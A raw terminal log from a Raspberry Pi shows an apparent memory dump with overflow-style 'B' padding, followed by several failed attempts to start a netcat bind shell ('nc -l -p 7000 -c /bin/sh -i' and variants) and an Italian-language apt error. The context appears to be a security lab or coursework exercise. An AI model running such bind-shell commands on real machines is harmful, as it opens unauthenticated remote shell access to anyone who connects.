0x7efffa5c: 7A 3D 30 31 3B 33 31 3A 2A 2E 74 7A 6F 3D 30 31 z=01;31:*.tzo=01
0x7efffa6c: 3B 33 31 3A 2A 2E 74 37 7A 3D 30 31 3B 33 31 3A ;31:*.t7z=01;31:
0x7efffa7c: 2A 2E 7A 69 70 3D 30 31 3B 33 31 3A 2A 2E 7A 3D *.zip=01;31:*.z=
0x7efffa8c: 30 31 3B 33 31 3A 2A 2E 5A 3D 30 31 3B 33 31 3A 01;31:*.Z=01;31:
0x7efffa9c: 2A 2E 64 7A 3D 30 31 3B 33 31 3A 2A 2E 67 7A 3D *.dz=01;31:*.gz=
0x7efffaac: 30 31 3B 33 31 3A 2A 2E 6C 72 7A 3D 30 31 3B 33 01;31:*.lrz=01;3
0x7efffabc: 31 3A 2A 2E 6C 1:*.l
BBBBBBBBBBBBBBBB¦
/bin/nc: invalid option -- 'c'
usage: nc [-46bCDdhjklnrStUuvZz] [-I length] [-i interval] [-O length]
          [-P proxy_username] [-p source_port] [-q seconds] [-s source]
          [-T toskeyword] [-V rtable] [-w timeout] [-X proxy_protocol]
          [-x proxy_address[:port]] [destination] [port]
pi@raspberrypi3_a0c2:~/cs $ nc --version
nc: invalid option -- '-'
usage: nc [-46bCDdhjklnrStUuvZz] [-I length] [-i interval] [-O length]
          [-P proxy_username] [-p source_port] [-q seconds] [-s source]
          [-T toskeyword] [-V rtable] [-w timeout] [-X proxy_protocol]
          [-x proxy_address[:port]] [destination] [port]
pi@raspberrypi3_a0c2:~/cs $ /bin/nc -l -p 7000 -c /bin/sh -i
/bin/nc: invalid option -- 'c'
usage: nc [-46bCDdhjklnrStUuvZz] [-I length] [-i interval] [-O length]
          [-P proxy_username] [-p source_port] [-q seconds] [-s source]
          [-T toskeyword] [-V rtable] [-w timeout] [-X proxy_protocol]
          [-x proxy_address[:port]] [destination] [port]
pi@raspberrypi3_a0c2:~/cs $ sudo apt get nc
E: Operazione get non valida
pi@raspberrypi3_a0c2:~/cs $ sudo apt-get nc
E: Operazione nc non valida
pi@raspberrypi3_a0c2:~/cs $ sudo apt-get install nc
Lettura elenco dei pacchetti... Fatto
Generazione albero delle dipendenze
Lettura informazioni sullo stato... Fatto
E: Impossibile trovare il pacchetto nc
pi@raspberrypi3_a0c2:~/cs $ /bin/nc -l -p 7000 -C /bin/sh -i
/bin/nc: option requires an argument -- 'i'
usage: nc [-46bCDdhjklnrStUuvZz] [-I length] [-i interval] [-O length]
          [-P proxy_username] [-p source_port] [-q seconds] [-s source]
          [-T toskeyword] [-V rtable] [-w timeout] [-X proxy_protocol]
          [-x proxy_address[:port]] [destination] [port]
pi@raspberrypi3_a0c2:~/cs $ nc
usage: nc [-46bCDdhjklnrStUuvZz] [-I length] [-i interval] [-O length]
          [-P proxy_username] [-p source_port] [-q seconds] [-s source]
          [-T toskeyword] [-V rtable] [-w timeout] [-X proxy_protocol]
          [-x proxy_address[:port]] [destination] [port]
pi@raspberrypi3_a0c2:~/cs $ /bin/nc -l -p 7000 -c "/bin/sh -i"
/bin/nc: invalid option -- 'c'
usage: nc [-46bCDdhjklnrStUuvZz] [-I length] [-i interval] [-O length]
          [-P proxy_username] [-p source_port] [-q seconds] [-s source]
          [-T toskeyword] [-V rtable] [-w timeout] [-X proxy_protocol]
          [-x proxy_address[:port]] [destination] [port]
pi@raspberrypi3_a0c2:~/cs $ /bin/nc -l -p 7000
ls
exit
quit
pi@raspberrypi3_a0c2:~/cs $ /bin/nc -l -p 7000 -s "/bin/sh -i"
nc: cannot use -s and -l
pi@raspberrypi3_a0c2:~/cs $




